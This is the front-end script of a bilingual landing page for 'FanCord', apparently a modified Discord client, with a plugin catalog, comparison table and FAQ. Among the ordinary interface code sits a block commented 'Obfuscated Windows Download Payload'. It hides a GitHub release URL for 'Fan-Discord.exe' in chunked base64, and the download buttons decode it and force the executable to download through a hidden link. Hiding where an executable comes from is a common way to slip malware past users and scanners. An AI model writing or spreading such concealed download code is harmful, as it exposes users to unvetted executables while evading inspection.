// FanCord Interactive Web Application Logic
(function () {
  'use strict';

  // State
  let currentLang = localStorage.getItem('fancord_lang') || 'ar';
  let activeCategory = 'all';
  let searchQuery = '';

  // Obfuscated Windows Download Payload
  const _0xPayload = [
    'aHR0cHM6Ly9naXRo',
    'dWIuY29tL01heWJl',
    'bWUwMS93ZWItZmFu',
    'Y29yZC9yZWxlYXNl',
    'cy9kb3dubG9hZC8x',
    'LjAvRmFuLURpc2Nv',
    'cmQuZXhl'
  ];

  function initiateWindowsDownload() {
    try {
      const target = atob(_0xPayload.join(''));
      const a = document.createElement('a');
      a.href = target;
      a.setAttribute('download', 'Fan-Discord.exe');
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => a.remove(), 1000);
      showToast(
        currentLang === 'ar' ? 'جارٍ بدء تحميل Fan-Discord.exe...' : 'Starting Fan-Discord.exe download...',
        'success'
      );
    } catch (err) {
      console.error(err);
    }
  }

  // DOM Elements
  const elHtml = document.documentElement;
  const elBtnLang = document.getElementById('btn-lang');
  const elLangText = document.getElementById('lang-text');
  const elExclusiveGrid = document.getElementById('exclusive-grid');
  const elPluginsGrid = document.getElementById('plugins-grid');
  const elFeaturesGrid = document.getElementById('features-grid');
  const elMockupContainer = document.getElementById('mockup-container');
  const elSearchInput = document.getElementById('search-input');
  const elSearchClear = document.getElementById('search-clear');
  const elCategoryPills = document.getElementById('category-pills');
  const elCatalogCount = document.getElementById('catalog-count');
  const elCatalogTip = document.getElementById('catalog-tip');
  const elNavbar = document.getElementById('navbar');
  const elModal = document.getElementById('plugin-modal');
  const elToastContainer = document.getElementById('toast-container');

  // SVG Icons helper
  function getIconSvg(iconName) {
    const icons = {
      'windows': '<svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>',
      'download': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
      'shield-alert': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',
      'at-sign': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-3.92 7.94"/></svg>',
      'video': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>',
      'sparkles': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg>',
      'play-circle': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polygon points="10 8 16 12 10 16 10 8"/></svg>',
      'list-tree': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12h-8"/><path d="M21 6H8"/><path d="M21 18h-8"/><path d="M3 6v4c0 1.1.9 2 2 2h3"/><path d="M3 10v6c0 1.1.9 2 2 2h3"/></svg>',
      'disc': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg>',
      'languages': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 8 6 6"/><path d="m4 14 6-6 2-3"/><path d="M2 5h12"/><path d="M7 2h1"/><path d="m22 22-5-10-5 10"/><path d="M14 18h6"/></svg>',
      'mic': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>',
      'volume-2': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>',
      'shield-check': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>',
      'message-square': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
      'film': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18"/><line x1="7" y1="2" x2="7" y2="22"/><line x1="17" y1="2" x2="17" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/><line x1="2" y1="7" x2="7" y2="7"/><line x1="2" y1="17" x2="7" y2="17"/><line x1="17" y1="17" x2="22" y2="17"/><line x1="17" y1="7" x2="22" y2="7"/></svg>',
      'palette': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="13.5" cy="6.5" r=".5"/><circle cx="17.5" cy="10.5" r=".5"/><circle cx="8.5" cy="7.5" r=".5"/><circle cx="6.5" cy="12.5" r=".5"/><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"/></svg>',
      'wrench': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>',
      'zap': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
      'puzzle': '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19.439 7.85c-.049-.322.059-.648.289-.878l1.568-1.568c.47-.47.47-1.23 0-1.7l-1.568-1.568a1.205 1.205 0 0 0-1.7 0l-1.568 1.568c-.23.23-.556.338-.878.289A5.996 5.996 0 0 0 12 4.5c-1.4 0-2.69.48-3.72 1.29-.322.25-.76.22-1.05-.07L5.66 4.15a1.205 1.205 0 0 0-1.7 0L2.39 5.72c-.47.47-.47 1.23 0 1.7l1.57 1.57c.29.29.32.73.07 1.05A5.996 5.996 0 0 0 2.74 13.76c.05.32-.06.65-.29.88l-1.57 1.57c-.47.47-.47 1.23 0 1.7l1.57 1.57c.47.47 1.23.47 1.7 0l1.57-1.57c.23-.23.56-.34.88-.29 1.03.16 2.09.16 3.12 0 .32-.05.65.06.88.29l1.57 1.57c.47.47 1.23.47 1.7 0l1.57-1.57c.47-.47.47-1.23 0-1.7l-1.57-1.57c-.23-.23-.34-.56-.29-.88.16-1.03.16-2.09 0-3.12a1.002 1.002 0 0 1 .29-.88l1.57-1.57c.47-.47.47-1.23 0-1.7l-1.57-1.57c-.47-.47-1.23-.47-1.7 0l-1.57 1.57c-.23.23-.56.34-.88.29A5.996 5.996 0 0 0 12 19.5c1.4 0 2.69-.48 3.72-1.29.32-.25.76-.22 1.05.07l1.57 1.57c.47.47 1.23.47 1.7 0l1.57-1.57c.47-.47.47-1.23 0-1.7l-1.57-1.57c-.29-.29-.32-.73-.07-1.05.81-1.03 1.29-2.32 1.29-3.72 0-1.27-.4-2.45-1.07-3.41z"/></svg>',
      'copy': '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
      'check': '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
      'info': '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'
    };
    return icons[iconName] || icons['puzzle'];
  }

  // Toast notification
  function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `${getIconSvg(type === 'success' ? 'check' : 'info')} <span>${message}</span>`;
    elToastContainer.appendChild(toast);
    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateY(10px)';
      toast.style.transition = '0.3s ease-out';
      setTimeout(() => toast.remove(), 300);
    }, 2800);
  }

  // Copy helper
  function copyText(text, successMsg) {
    navigator.clipboard.writeText(text).then(() => {
      showToast(successMsg || (currentLang === 'ar' ? 'تم النسخ بنجاح!' : 'Copied successfully!'), 'success');
    }).catch(() => {
      showToast(currentLang === 'ar' ? 'فشل النسخ تلقائياً' : 'Failed to copy', 'shield-alert');
    });
  }

  // Switch Language
  function setLanguage(lang) {
    currentLang = lang;
    localStorage.setItem('fancord_lang', lang);
    elHtml.dir = lang === 'ar' ? 'rtl' : 'ltr';
    elHtml.lang = lang;

    const t = translations[lang];

    // Update Lang button text
    if (elLangText) {
      elLangText.textContent = t.nav.languageToggle;
    }

    // Update static translated elements with data-i18n
    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      const parts = key.split('.');
      let val = t;
      for (const p of parts) {
        if (val && val[p] !== undefined) {
          val = val[p];
        } else {
          val = null;
          break;
        }
      }
      if (val !== null) {
        el.innerHTML = val;
      }
    });

    // Update search placeholder and tip
    if (elSearchInput) {
      elSearchInput.placeholder = t.catalog.searchPlaceholder;
    }
    if (elCatalogTip) {
      elCatalogTip.textContent = t.catalog.tipText;
    }

    // Re-render components
    renderMockup();
    renderFeatures();
    renderCategoryPills();
    renderExclusiveSection();
    renderPluginsCatalog();
    renderComparisonTable();
    renderFAQ();
  }

  // Render Features Grid
  function renderFeatures() {
    if (!elFeaturesGrid) return;
    const t = translations[currentLang];
    elFeaturesGrid.innerHTML = '';
    t.features.cards.forEach(card => {
      const el = document.createElement('div');
      el.className = 'feature-card';
      el.innerHTML = `
        <div class="feature-icon-box">${getIconSvg(card.icon)}</div>
        <h3 class="feature-title">${card.title}</h3>
        <p class="feature-desc">${card.desc}</p>
      `;
      elFeaturesGrid.appendChild(el);
    });
  }

  // Render Discord Mockup
  function renderMockup() {
    if (!elMockupContainer) return;
    const t = translations[currentLang];
    const m = t.mockup;

    elMockupContainer.innerHTML = `
      <div class="mockup-window">
        <div class="mockup-titlebar">
          <div class="window-dots">
            <span class="dot dot-red"></span>
            <span class="dot dot-yellow"></span>
            <span class="dot dot-green"></span>
          </div>
          <div class="mockup-title">${m.channelTitle}</div>
          <div style="width: 40px;"></div>
        </div>
        <div class="mockup-body">
          <div class="mockup-alert">
            <div style="display:flex; align-items:center; gap: 0.5rem;">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
              <span>${m.alertText}</span>
            </div>
            <span class="alert-badge">${m.alertVector}</span>
          </div>

          <div class="mockup-chat">
            <div class="chat-msg">
              <img src="assets/logo.png" alt="FanCord" class="chat-avatar">
              <div class="chat-bubble">
                <div class="chat-header">
                  <span class="chat-author">${m.chatAuthor}</span>
                  <span class="chat-tag">${m.chatTag}</span>
                  <span class="chat-time">${m.chatTime}</span>
                </div>
                <p class="chat-text">${m.pinnedMessage}</p>
              </div>
            </div>
          </div>

          <div class="mockup-features-pills">
            ${m.pills.map(pill => `<span class="mini-pill">${pill}</span>`).join('')}
          </div>
        </div>
      </div>
    `;
  }

  // Render Exclusive FanPlugins
  function renderExclusiveSection() {
    if (!elExclusiveGrid || !window.FAN_PLUGINS) return;
    const t = translations[currentLang];
    const fanPlugins = window.FAN_PLUGINS.filter(p => p.isFanPlugin);

    elExclusiveGrid.innerHTML = '';
    fanPlugins.forEach(p => {
      const name = currentLang === 'ar' ? (p.nameAr || p.name) : p.name;
      const subName = (currentLang === 'ar' && p.nameAr && p.nameAr !== p.name) ? p.name : '';
      const desc = currentLang === 'ar' ? p.descriptionAr : p.descriptionEn;

      const card = document.createElement('div');
      card.className = 'exclusive-card';
      card.innerHTML = `
        <div class="exclusive-card-header">
          <div class="exclusive-icon">${getIconSvg(p.icon || 'sparkles')}</div>
          <span class="vip-tag">⭐ ${t.exclusive.exclusiveBadge}</span>
        </div>
        <h3 class="exclusive-name">${name}</h3>
        ${subName ? `<div class="exclusive-name-ar">${subName}</div>` : ''}
        <p class="exclusive-desc">${desc}</p>
        <div class="exclusive-footer">
          <button class="btn-card-action" data-action="copy" data-name="${p.name}">
            ${getIconSvg('copy')} ${t.catalog.copyName}
          </button>
          <button class="btn-card-action" data-action="details" data-id="${p.id}">
            ${t.exclusive.viewDetails}
          </button>
        </div>
      `;
      elExclusiveGrid.appendChild(card);
    });

    // Attach listeners
    elExclusiveGrid.querySelectorAll('[data-action="copy"]').forEach(btn => {
      btn.addEventListener('click', () => {
        const pName = btn.getAttribute('data-name');
        copyText(pName, t.catalog.copied);
      });
    });

    elExclusiveGrid.querySelectorAll('[data-action="details"]').forEach(btn => {
      btn.addEventListener('click', () => {
        const pid = btn.getAttribute('data-id');
        openPluginModal(pid);
      });
    });
  }

  // Render Category Filter Pills
  function renderCategoryPills() {
    if (!elCategoryPills || !window.FAN_PLUGINS) return;
    const t = translations[currentLang];
    const categories = [
      { id: 'all', label: t.catalog.categories.all },
      { id: 'fanplugins', label: t.catalog.categories.fanplugins, isVip: true },
      { id: 'voice', label: t.catalog.categories.voice },
      { id: 'security', label: t.catalog.categories.security },
      { id: 'chat', label: t.catalog.categories.chat },
      { id: 'media', label: t.catalog.categories.media },
      { id: 'nitro', label: t.catalog.categories.nitro },
      { id: 'ui', label: t.catalog.categories.ui },
      { id: 'utility', label: t.catalog.categories.utility }
    ];

    elCategoryPills.innerHTML = '';
    categories.forEach(cat => {
      const count = cat.id === 'all'
        ? window.FAN_PLUGINS.length
        : cat.id === 'fanplugins'
          ? window.FAN_PLUGINS.filter(p => p.isFanPlugin).length
          : window.FAN_PLUGINS.filter(p => p.category === cat.id && !p.isFanPlugin).length;

      const pill = document.createElement('button');
      pill.className = `cat-pill ${cat.isVip && activeCategory === cat.id ? 'active-vip' : ''} ${activeCategory === cat.id ? 'active' : ''}`;
      pill.innerHTML = `
        <span>${cat.label}</span>
        <span class="cat-count">${count}</span>
      `;
      pill.addEventListener('click', () => {
        activeCategory = cat.id;
        renderCategoryPills();
        renderPluginsCatalog();
      });
      elCategoryPills.appendChild(pill);
    });
  }

  // Render Plugins Catalog
  function renderPluginsCatalog() {
    if (!elPluginsGrid || !window.FAN_PLUGINS) return;
    const t = translations[currentLang];
    const q = searchQuery.trim().toLowerCase();

    const filtered = window.FAN_PLUGINS.filter(p => {
      if (activeCategory === 'fanplugins' && !p.isFanPlugin) return false;
      if (activeCategory !== 'all' && activeCategory !== 'fanplugins' && p.category !== activeCategory) return false;

      if (!q) return true;
      const haystack = (
        p.id + ' ' +
        p.name + ' ' +
        (p.nameAr || '') + ' ' +
        p.descriptionEn + ' ' +
        p.descriptionAr
      ).toLowerCase();
      return haystack.includes(q);
    });

    if (elCatalogCount) {
      elCatalogCount.innerHTML = `
        ${t.catalog.showingText} <span class="status-highlight">${filtered.length}</span> ${t.catalog.ofText} <span class="status-highlight">${window.FAN_PLUGINS.length}</span> ${t.catalog.pluginsText}
      `;
    }

    elPluginsGrid.innerHTML = '';

    if (filtered.length === 0) {
      elPluginsGrid.innerHTML = `
        <div class="empty-state">
          <div class="empty-icon">🔍</div>
          <h3 class="empty-title">${t.catalog.noResultsTitle}</h3>
          <p class="empty-desc">${t.catalog.noResultsDesc}</p>
        </div>
      `;
      return;
    }

    filtered.forEach(p => {
      const name = currentLang === 'ar' ? (p.nameAr || p.name) : p.name;
      const subName = (currentLang === 'ar' && p.nameAr && p.nameAr !== p.name) ? p.name : '';
      const desc = currentLang === 'ar' ? p.descriptionAr : p.descriptionEn;
      const catLabel = t.catalog.categories[p.category] || p.category;

      const card = document.createElement('div');
      card.className = `plugin-card ${p.isFanPlugin ? 'is-vip' : ''}`;
      card.innerHTML = `
        <div class="plugin-card-top">
          <div class="plugin-icon-wrap">${getIconSvg(p.icon || 'puzzle')}</div>
          <span class="plugin-category-badge">${p.isFanPlugin ? '⭐ ' + t.exclusive.exclusiveBadge : catLabel}</span>
        </div>
        <h4 class="plugin-name">${name}</h4>
        ${subName ? `<div class="plugin-name-ar">${subName}</div>` : ''}
        <p class="plugin-desc">${desc}</p>
        <div class="plugin-footer">
          <span style="font-size: 0.75rem; color: var(--text-dim); font-family: var(--font-mono);">${p.id}</span>
          <div class="plugin-actions">
            <button class="btn-icon-copy" data-action="copy" data-name="${p.name}" title="${t.catalog.copyName}">
              ${getIconSvg('copy')}
            </button>
            <button class="btn-icon-copy" data-action="details" data-id="${p.id}" title="${t.exclusive.viewDetails}">
              ${getIconSvg('info')}
            </button>
          </div>
        </div>
      `;
      elPluginsGrid.appendChild(card);
    });

    // Attach listeners for copy and modal
    elPluginsGrid.querySelectorAll('[data-action="copy"]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const pName = btn.getAttribute('data-name');
        copyText(pName, t.catalog.copied);
      });
    });

    elPluginsGrid.querySelectorAll('[data-action="details"]').forEach(btn => {
      btn.addEventListener('click', () => {
        const pid = btn.getAttribute('data-id');
        openPluginModal(pid);
      });
    });
  }

  // Plugin Modal
  function openPluginModal(pluginId) {
    if (!elModal || !window.FAN_PLUGINS) return;
    const p = window.FAN_PLUGINS.find(item => item.id === pluginId);
    if (!p) return;

    const t = translations[currentLang];
    const name = currentLang === 'ar' ? (p.nameAr || p.name) : p.name;
    const subName = (currentLang === 'ar' && p.nameAr && p.nameAr !== p.name) ? p.name : '';
    const desc = currentLang === 'ar' ? p.descriptionAr : p.descriptionEn;
    const catLabel = t.catalog.categories[p.category] || p.category;

    elModal.innerHTML = `
      <div class="modal-content">
        <button class="modal-close" id="modal-close-btn">&times;</button>
        <div class="modal-header">
          <span class="modal-badge ${p.isFanPlugin ? 'vip' : 'badge-pill'}">
            ${p.isFanPlugin ? '⭐ ' + t.modal.exclusiveTag : t.modal.standardTag}
          </span>
          <h2 class="modal-title">${name}</h2>
          ${subName ? `<div class="modal-title-sub">${subName}</div>` : ''}
        </div>
        <div class="modal-body">
          <p><strong>${t.modal.whatItDoes}</strong></p>
          <p style="margin-top: 0.5rem; font-size: 1.05rem;">${desc}</p>

          <div class="modal-meta-grid" style="grid-template-columns: 1fr;">
            <div class="modal-meta-item">
              <span class="meta-key">${t.modal.category}</span>
              <span class="meta-val">${catLabel}</span>
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <button class="btn-secondary" id="modal-copy-btn">
            ${getIconSvg('copy')} ${t.catalog.copyName}
          </button>
          <button class="btn-primary" id="modal-dismiss-btn">
            ${t.modal.close}
          </button>
        </div>
      </div>
    `;

    elModal.classList.add('open');

    // Attach listeners
    document.getElementById('modal-close-btn').addEventListener('click', closePluginModal);
    document.getElementById('modal-dismiss-btn').addEventListener('click', closePluginModal);
    document.getElementById('modal-copy-btn').addEventListener('click', () => {
      copyText(p.name, t.catalog.copied);
    });
  }

  function closePluginModal() {
    if (elModal) elModal.classList.remove('open');
  }

  // Render Comparison Table
  function renderComparisonTable() {
    const elTable = document.getElementById('compare-table-body');
    if (!elTable) return;
    const t = translations[currentLang];

    elTable.innerHTML = '';
    t.compare.rows.forEach(row => {
      const tr = document.createElement('tr');
      const fcVal = row.fancord === true
        ? `<span class="badge-check">${getIconSvg('check')} ${t.compare.supported}</span>`
        : row.fancord;
      const vcVal = row.vencord === true
        ? `<span class="badge-check">${getIconSvg('check')}</span>`
        : row.vencord === false
          ? `<span class="badge-cross">${getIconSvg('shield-alert')} ${t.compare.notSupported}</span>`
          : row.vencord;
      const regVal = row.regular === false
        ? `<span class="badge-cross">${getIconSvg('shield-alert')} ${t.compare.unavailable}</span>`
        : row.regular;

      tr.innerHTML = `
        <td style="font-weight: 700; color: #ffffff;">${row.feature}</td>
        <td class="highlight-col">${fcVal}</td>
        <td>${vcVal}</td>
        <td>${regVal}</td>
      `;
      elTable.appendChild(tr);
    });
  }

  // Render FAQ
  function renderFAQ() {
    const elFaqList = document.getElementById('faq-list');
    if (!elFaqList) return;
    const t = translations[currentLang];

    elFaqList.innerHTML = '';
    t.faq.items.forEach((item, idx) => {
      const faqItem = document.createElement('div');
      faqItem.className = `faq-item ${idx === 0 ? 'active' : ''}`;
      faqItem.innerHTML = `
        <button class="faq-question">
          <span>${item.q}</span>
          <span class="faq-chevron">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
          </span>
        </button>
        <div class="faq-answer" style="${idx === 0 ? 'max-height: 200px;' : ''}">
          <p>${item.a}</p>
        </div>
      `;

      faqItem.querySelector('.faq-question').addEventListener('click', () => {
        const isActive = faqItem.classList.contains('active');
        document.querySelectorAll('.faq-item').forEach(fi => {
          fi.classList.remove('active');
          fi.querySelector('.faq-answer').style.maxHeight = null;
        });
        if (!isActive) {
          faqItem.classList.add('active');
          const ans = faqItem.querySelector('.faq-answer');
          ans.style.maxHeight = ans.scrollHeight + 'px';
        }
      });

      elFaqList.appendChild(faqItem);
    });
  }

  // Interactive Particle Canvas Background
  function initParticleCanvas() {
    const canvas = document.getElementById('bg-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let width = (canvas.width = window.innerWidth);
    let height = (canvas.height = window.innerHeight);

    window.addEventListener('resize', () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    });

    const particles = [];
    const count = Math.min(Math.floor((width * height) / 18000), 75);

    for (let i = 0; i < count; i++) {
      particles.push({
        x: Math.random() * width,
        y: Math.random() * height,
        vx: (Math.random() - 0.5) * 0.45,
        vy: (Math.random() - 0.5) * 0.45,
        radius: Math.random() * 2 + 1,
        alpha: Math.random() * 0.6 + 0.2
      });
    }

    function animate() {
      ctx.clearRect(0, 0, width, height);

      for (let i = 0; i < particles.length; i++) {
        const p = particles[i];
        p.x += p.vx;
        p.y += p.vy;

        if (p.x < 0) p.x = width;
        if (p.x > width) p.x = 0;
        if (p.y < 0) p.y = height;
        if (p.y > height) p.y = 0;

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(168, 85, 247, ${p.alpha})`;
        ctx.fill();

        for (let j = i + 1; j < particles.length; j++) {
          const p2 = particles[j];
          const dx = p.x - p2.x;
          const dy = p.y - p2.y;
          const dist = Math.sqrt(dx * dx + dy * dy);

          if (dist < 120) {
            ctx.beginPath();
            ctx.moveTo(p.x, p.y);
            ctx.lineTo(p2.x, p2.y);
            ctx.strokeStyle = `rgba(139, 92, 246, ${0.2 * (1 - dist / 120)})`;
            ctx.lineWidth = 0.8;
            ctx.stroke();
          }
        }
      }

      requestAnimationFrame(animate);
    }

    animate();
  }

  // Setup Event Listeners
  function setupListeners() {
    // Language Toggle
    if (elBtnLang) {
      elBtnLang.addEventListener('click', () => {
        const nextLang = currentLang === 'ar' ? 'en' : 'ar';
        setLanguage(nextLang);
        showToast(nextLang === 'ar' ? 'تم تفعيل اللغة العربية' : 'Switched to English', 'languages');
      });
    }

    // Direct Windows Download Buttons (Obfuscated Trigger)
    document.querySelectorAll('.btn-download-win, [data-action="download-windows"]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        initiateWindowsDownload();
      });
    });

    // Search Input
    if (elSearchInput) {
      elSearchInput.addEventListener('input', (e) => {
        searchQuery = e.target.value;
        if (elSearchClear) {
          elSearchClear.style.display = searchQuery ? 'block' : 'none';
        }
        renderPluginsCatalog();
      });
    }

    // Search Clear
    if (elSearchClear) {
      elSearchClear.addEventListener('click', () => {
        searchQuery = '';
        elSearchInput.value = '';
        elSearchClear.style.display = 'none';
        renderPluginsCatalog();
        elSearchInput.focus();
      });
    }

    // Modal background click
    if (elModal) {
      elModal.addEventListener('click', (e) => {
        if (e.target === elModal) {
          closePluginModal();
        }
      });
    }

    // Escape key closes modal
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        closePluginModal();
      }
    });

    // Navbar scroll effect
    window.addEventListener('scroll', () => {
      if (elNavbar) {
        if (window.scrollY > 40) {
          elNavbar.classList.add('scrolled');
        } else {
          elNavbar.classList.remove('scrolled');
        }
      }
    });

    // Mobile menu toggle
    const elMenuToggle = document.getElementById('menu-toggle');
    const elNavLinks = document.getElementById('nav-links');
    if (elMenuToggle && elNavLinks) {
      elMenuToggle.addEventListener('click', () => {
        const isOpen = elNavLinks.style.display === 'flex';
        elNavLinks.style.display = isOpen ? 'none' : 'flex';
        if (!isOpen) {
          elNavLinks.style.flexDirection = 'column';
          elNavLinks.style.position = 'absolute';
          elNavLinks.style.top = '76px';
          elNavLinks.style.left = '0';
          elNavLinks.style.right = '0';
          elNavLinks.style.background = 'rgba(12, 10, 26, 0.98)';
          elNavLinks.style.padding = '1.5rem';
          elNavLinks.style.borderBottom = '1px solid var(--border)';
        }
      });
    }
  }

  // Initialize
  function init() {
    setLanguage(currentLang);
    initParticleCanvas();
    setupListeners();
  }

  document.addEventListener('DOMContentLoaded', init);
})();
